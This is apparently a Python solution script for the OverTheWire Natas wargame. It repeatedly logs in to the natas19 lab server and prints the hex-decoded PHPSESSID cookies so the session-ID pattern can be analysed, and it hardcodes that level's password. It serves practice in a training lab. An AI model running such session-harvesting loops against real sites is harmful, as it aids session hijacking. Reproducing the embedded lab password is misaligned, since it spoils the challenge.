#!/usr/bin/env python3
#
# Cookie harvester used for the 18th Natas challenge
#
import requests, sys, signal, binascii

def signal_handler(signal, frame):
    print("Exiting")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

url = "http://natas19.natas.labs.overthewire.org/index.php"
headers= {
    "User-Agent": "Mozilla/5.0"
}
data = {
    "username": "admin",
    "password": "admin"
}

while True:
    resp = requests.post(url, headers=headers, data=data, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))
    print(binascii.unhexlify(resp.cookies['PHPSESSID']))
